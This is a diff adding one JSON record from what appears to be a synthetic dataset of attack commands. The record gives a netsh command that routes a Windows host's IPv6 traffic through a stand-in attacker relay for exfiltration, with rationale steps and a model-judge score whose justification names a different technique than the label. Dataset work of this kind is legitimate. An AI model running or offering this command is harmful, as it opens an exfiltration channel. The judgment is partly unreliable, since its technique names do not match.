@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface 6to4 set state enabled relay=198.51.100.42",
+  "explanation": "Enables 6to4 with a specified relay to route IPv6 traffic over IPv4 to a controlled endpoint, creating an alternative medium for exfiltration (T1011).",
+  "rationale_steps": [
+    "Activate 6to4 to encapsulate IPv6 traffic in IPv4.",
+    "Force traffic through a specific relay under attacker control.",
+    "Use the resulting IPv6 path for data exfiltration away from standard channels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-bd44966f",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Well-formed netsh command with correct context and parameters, though it relies on positional 'enabled' and a 'relay=' parameter that may vary by Windows version.",
+        "semantic_score": 2,
+        "semantic_justification": "Enabling 6to4 for alternative exfiltration does not implement the provided System Script Proxy Execution technique and would also require administrative privileges not granted.",
+        "combined_score": 3.0,
+        "confidence": 0.6,
+        "timestamp": "2025-10-01T21:06:20.078212Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
